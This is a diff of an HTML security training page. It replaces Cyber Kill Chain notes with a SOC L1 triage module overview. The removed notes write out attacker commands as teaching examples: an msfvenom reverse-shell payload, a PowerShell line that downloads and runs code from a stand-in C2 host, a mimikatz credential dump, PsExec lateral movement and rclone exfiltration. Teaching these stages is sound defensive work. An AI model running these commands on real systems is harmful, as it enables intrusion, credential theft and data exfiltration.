@@ -1,46 +1,24 @@
 <div class="p-4 rounded mb-4" style="background:rgba(17,24,39,0.9);border:1px solid #1f2937;">
-<h6 class="text-danger mb-3"><i class="bi bi-book me-2"></i>Elaborated Notes with Examples</h6>
+<h6 class="text-info mb-3"><i class="bi bi-book me-2"></i>Module 2: SOC Team Internals</h6>
 
-<h6 class="text-danger mt-3">1. Reconnaissance</h6>
-<p>Attackers gather information about the target using passive (OSINT, WHOIS, DNS enumeration) and active (nmap, Shodan) techniques to identify attack surface.</p>
+<h6 class="text-info mt-3">Sub-Domains / Rooms</h6>
+<ul style="color:#c0d0e0;">
+  <li><b>SOC L1 Alert Triage</b> — Prioritize and classify alerts (TP vs FP vs BP), use playbooks, and follow escalation paths.</li>
+  <li><b>SOC L1 Alert Reporting</b> — Document findings with structured reports, including timeline, IOCs, and actions taken.</li>
+  <li><b>SOC Workbooks and Lookups</b> — Use structured workbooks to track investigations and enrich data with lookup tables.</li>
+  <li><b>SOC Metrics and Objectives</b> — Measure SOC performance with KPIs like MTTR, alert volume, and detection rate.</li>
+  <li><b>SOC Simulator: Introduction to Phishing</b> — Simulated phishing triage scenarios to practice real-world workflows.</li>
+</ul>
+
 <div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
-<b>Example:</b> An attacker uses <code>nmap -sV -p 1-65535 target.com</code> to discover open ports 80 (Apache 2.4.49) and 22 (OpenSSH 8.0). They then use Shodan to find the same server hosts a WordPress 5.6 site, making it a target for CVE-2021-41773 (Apache path traversal) and vulnerable plugin exploitation.
+<b>Example Workflow:</b> An L1 analyst receives a SIEM alert: "Suspicious PowerShell execution from WINWORD.EXE." The analyst checks the workbook, finds no prior incidents from this endpoint. They look up the process hash in VirusTotal — 0 detections (unknown file). They enrich with geo-IP: the C2 IP resolves to Russia. The analyst writes a report, classifies as TP (True Positive), and escalates to L2 with all evidence attached.
 </div>
 
-<h6 class="text-danger mt-3">2. Weaponization</h6>
-<p>The attacker creates a deliverable payload — a malicious document, script, or exploit tied to a dropper/backdoor. Toolkits like Metasploit or Cobalt Strike generate payloads tailored to the target environment.</p>
-<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
-<b>Example:</b> Using <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > payload.exe</code>, the attacker generates a staged Meterpreter payload that connects back on execution. The payload is embedded inside a PDF disguised as an invoice using the EvilPDF toolkit to evade static detection.
-</div>
-
-<h6 class="text-danger mt-3">3. Delivery</h6>
-<p>The weaponized payload is transmitted to the target via email phishing, malicious USB drops, watering hole attacks, or drive-by downloads.</p>
-<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
-<b>Example:</b> A spear-phishing email impersonating the company's IT department warns "Your mailbox is full — verify now to avoid deletion." The <code>&lt;a&gt;</code> link points to <code>hxxp://malicious[.]com/invoice.docm</code>. The attachment filename is <code>Invoice_April2026.docm</code> with a valid-looking 2-page document.
-</div>
-
-<h6 class="text-danger mt-3">4. Exploitation</h6>
-<p>The payload triggers a vulnerability or social engineering vector to gain initial code execution on the target system.</p>
-<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
-<b>Example:</b> The <code>.docm</code> file contains a VBA macro that calls <code>Shell("powershell -enc JABXAG8AZABlAHMAIAA9ACAAKAApAA==")</code>. The PowerShell payload downloads and executes a Cobalt Strike beacon via <code>IEX (New-Object Net.WebClient).DownloadString('hxxp://c2/malware.ps1')</code>. The user enables macros because the document says "Protected Document — Enable Content."
-</div>
-
-<h6 class="text-danger mt-3">5. Installation</h6>
-<p>Malware establishes persistence — writing to registry <code>Run</code> keys, creating scheduled tasks, or installing as a service — and may escalate privileges.</p>
-<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
-<b>Example:</b> The beacon writes <code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Updater</code> with value <code>C:\Users\victim\AppData\Local\svchost.exe</code>. A scheduled task named <code>AdobeUpdateTask</code> runs every 4 hours. Privilege escalation uses <code>JuicyPotato</code> via <code>SeImpersonatePrivilege</code> to gain NT AUTHORITY\SYSTEM.
-</div>
-
-<h6 class="text-danger mt-3">6. Command & Control (C2)</h6>
-<p>Malware establishes an outbound channel to the attacker's infrastructure, commonly over HTTP/HTTPS, DNS tunneling, or custom protocols, often using domain fronting or beaconing.</p>
-<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
-<b>Example:</b> The beacon communicates with <code>malicious-update[.]com/api/v2/status</code> every 60 seconds using HTTPS with a random jitter of ±30s. The C2 traffic mimics a legitimate API with <code>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36</code>. JA3 fingerprint clustering reveals the TLS handshake matches known Cobalt Strike signatures.
-</div>
-
-<h6 class="text-danger mt-3">7. Actions on Objectives</h6>
-<p>The attacker achieves their goal — data exfiltration, ransomware deployment, lateral movement, or credential theft — using tools like Mimikatz, PsExec, or Rclone.</p>
-<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
-<b>Example:</b> The attacker runs <code>mimikatz.exe "sekurlsa::logonpasswords" exit</code> to dump domain admin credentials from lsass, then uses <code>PsExec \\DC01 -u DOMAIN\admin cmd.exe</code> to move laterally. Finally, they archive <code>\\DC01\SYSVOL\*</code> with 7-Zip and exfiltrate via <code>rclone copy secrets.7z remote:dropbox --transfers 4</code>.
-</div>
-
+<h6 class="text-info mt-3">Key Skills Learned</h6>
+<ul style="color:#c0d0e0;">
+  <li>Alert classification (TP, FP, BP)</li>
+  <li>Incident documentation and reporting</li>
+  <li>SOC metrics and performance measurement</li>
+  <li>Phishing triage workflows</li>
+</ul>
 </div>
